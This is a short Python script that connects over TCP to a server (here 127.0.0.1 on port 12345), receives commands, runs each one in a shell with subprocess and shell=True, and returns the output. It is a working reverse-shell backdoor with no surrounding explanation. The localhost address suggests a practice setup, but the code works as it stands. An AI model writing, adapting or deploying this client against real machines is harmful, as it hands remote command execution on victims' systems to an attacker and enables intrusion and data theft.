import socket
import subprocess

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('127.0.0.1', 12345))

    print("Connected to the server.")

    while True:
        command = client_socket.recv(1024).decode()
        if not command:
            break

        # Execute the command and capture the output
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:
            output = f"Error: {e.output}"

        # Send the command output back to the server
        client_socket.send(output.encode())

    client_socket.close()

if __name__ == "__main__":
    main()
